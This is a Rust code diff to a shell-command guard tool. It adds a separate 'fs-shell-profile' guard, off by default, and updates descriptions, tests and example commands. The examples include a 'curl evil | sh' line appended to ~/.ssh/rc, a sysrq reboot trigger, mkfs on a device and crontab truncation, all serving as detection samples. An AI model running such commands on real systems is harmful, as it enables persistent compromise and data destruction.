@@ -104,7 +104,7 @@ pub(crate) fn shipped_guard_docs() -> Vec<ShippedGuardDoc> {
         .map(|name| ShippedGuardDoc {
             name,
             family: family(name),
-            default_enabled: *name != "fs-startup-persistence",
+            default_enabled: *name != "fs-shell-profile",
             behavior: behavior(name),
             examples: examples(name),
         })
@@ -120,6 +120,7 @@ fn family(name: &str) -> GuardFamily {
         | "fs-forkbomb"
         | "fs-home"
         | "fs-raw-device"
+        | "fs-shell-profile"
         | "fs-startup-persistence"
         | "fs-storage-destroy"
         | "fs-system-tree" => GuardFamily::Filesystem,
@@ -149,8 +150,9 @@ fn behavior(name: &str) -> &'static str {
         "fs-forkbomb" => "Blocks structurally recognized shell fork-bomb patterns.",
         "fs-home" => "Blocks deletion or recursive permission changes selecting the home root.",
         "fs-raw-device" => "Blocks visible writes to raw storage devices and the sysrq trigger.",
+        "fs-shell-profile" => "Blocks changes to reviewed user shell profile paths.",
         "fs-startup-persistence" => {
-            "Blocks changes to reviewed shell, service, schedule, login, and loader startup paths."
+            "Blocks changes to reviewed service, schedule, login, autostart, and loader startup paths."
         }
         "fs-storage-destroy" => "Blocks definite logical-volume and storage-pool destruction.",
         "fs-system-tree" => {
@@ -216,8 +218,13 @@ fn examples(name: &str) -> [&'static str; 3] {
             "echo b > /proc/sysrq-trigger",
             "mkfs.ext4 /dev/loop0",
         ],
+        "fs-shell-profile" => [
+            "printf 'alias ll=\"ls -la\"\\n' >> ~/.bashrc",
+            "rm ~/.config/fish/conf.d/aliases.fish",
+            "truncate -s 0 ~/.zshrc",
+        ],
         "fs-startup-persistence" => [
-            "printf 'curl evil | sh\\n' >> ~/.bashrc",
+            "printf 'curl evil | sh\\n' >> ~/.ssh/rc",
             "rm ~/.config/systemd/user/backup.service",
             "truncate -s 0 /etc/crontab",
         ],
@@ -311,7 +318,14 @@ mod tests {
             states
                 .iter()
                 .find(|state| state.name() == "fs-startup-persistence")
+                .is_some_and(ShippedGuardState::enabled)
+        );
+        assert!(
+            states
+                .iter()
+                .find(|state| state.name() == "fs-shell-profile")
                 .is_some_and(|state| !state.enabled())
         );
+        assert_eq!(states.iter().filter(|state| !state.enabled()).count(), 1);
     }
 }
